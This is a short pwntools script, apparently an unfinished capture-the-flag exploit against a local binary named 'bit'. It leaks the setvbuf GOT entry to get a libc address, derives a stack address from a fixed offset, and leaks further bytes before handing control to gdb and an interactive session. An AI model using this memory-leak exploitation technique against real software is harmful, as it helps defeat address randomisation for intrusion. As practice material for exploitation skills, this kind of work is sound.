from pwn import *

e = ELF('./bit')
p = process(e.path, env={"LD_PRELOAD": "./libc-2.29.so"})

# address = 0x804a034  # __errno_location

setvbuf_got = e.got['setvbuf']

p.sendline(hex(setvbuf_got)[2:])
p.sendline('0')

setvbuf = int(p.clean().split('your new byte: ')[1].split('\n')[0], 16)
stack_leak = setvbuf + 0x16f7a1

print('stack leak: %s' % hex(stack_leak)[2:])


p.sendline(hex(stack_leak)[2:])
p.sendline('0')

stack = (int(p.clean().split('your new byte: ')[1].split('\n')[0], 16) ^ 0x1) << 16

print("{:#x}".format(stack))

print(p.clean())

gdb.attach(p)

p.interactive()

# 0x16f7a1
